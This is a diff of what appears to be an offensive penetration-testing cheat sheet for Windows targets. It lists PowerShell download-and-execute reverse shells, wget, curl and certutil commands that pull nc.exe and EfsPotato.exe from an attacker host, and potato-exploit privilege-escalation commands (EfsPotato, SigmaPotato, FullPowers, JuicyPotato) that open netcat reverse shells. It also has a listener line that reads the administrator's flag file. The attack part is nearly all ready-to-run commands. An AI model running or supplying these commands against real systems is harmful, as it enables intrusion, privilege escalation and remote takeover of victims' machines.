@@ -1092,15 +1092,14 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shel
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/resh.ps1');resh -Reverse $MYIP -Port 5555"
 
 [*] File Transfer
-wget http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe
+wget http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe && wget http://$MYIP:8888/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
 wget http://$MYIP:8888/bat2exe.bat -o \programdata\bat2exe.bat
-wget http://$MYIP:8888/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
-curl http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe
+curl http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe && curl http://$MYIP:8888/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
 curl http://$MYIP:8888/bat2exe.bat -o \programdata\bat2exe.bat
-curl http://$MYIP:8888/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
-certutil -urlcache -f http://$MYIP:8888/windows/nc.exe \programdata\nc.exe
+
+certutil -urlcache -f http://$MYIP:8888/windows/nc.exe \programdata\nc.exe && certutil -urlcache -f http://$MYIP:8888/windows/EfsPotato.exe \programdata\EfsPotato.exe
 certutil -urlcache -f http://$MYIP:8888/bat2exe.bat \programdata\bat2exe.bat
-certutil -urlcache -f http://$MYIP:8888/windows/EfsPotato.exe \programdata\EfsPotato.exe
+
 
 [*] Privilege Escalation
 +---------- Initial Checks ----------+
@@ -1142,9 +1141,10 @@ powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/
 robocopy /b \Users\Administrator\Desktop .
 
 +---------- SeImpersonatePrivilege ----------+
-C:\programdata\FullPowers.exe -c "C:\programdata\EfsPotato.exe \"C:\programdata\nc.exe $MYIP 5555 -e cmd\"" -z
-C:\programdata\EfsPotato.exe "C:\programdata\nc.exe $MYIP 5555 -e cmd"
-C:\programdata\SigmaPotato.exe "C:\programdata\nc.exe $MYIP 5555 -e cmd"
+echo -e 'type C:\\users\\administrator\\desktop\\root.txt' | rlwrap nc -lvnp 5566
+C:\programdata\EfsPotato.exe "C:\programdata\nc.exe $MYIP 5566 -e cmd"
+C:\programdata\FullPowers.exe -c "C:\programdata\EfsPotato.exe \"C:\programdata\nc.exe $MYIP 5566 -e cmd\"" -z
+C:\programdata\SigmaPotato.exe "C:\programdata\nc.exe $MYIP 5566 -e cmd"
 C:\programdata\jp32.exe -l 1337 -p "cmd.exe" -a "/c \programdata\nc.exe $MYIP 5678 -e cmd"  -t * -c {3c6859ce-230b-48a4-be6c-932c0c202048}
 https://ohpe.it/juicy-potato/CLSID/
 Windows Server 2008     {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
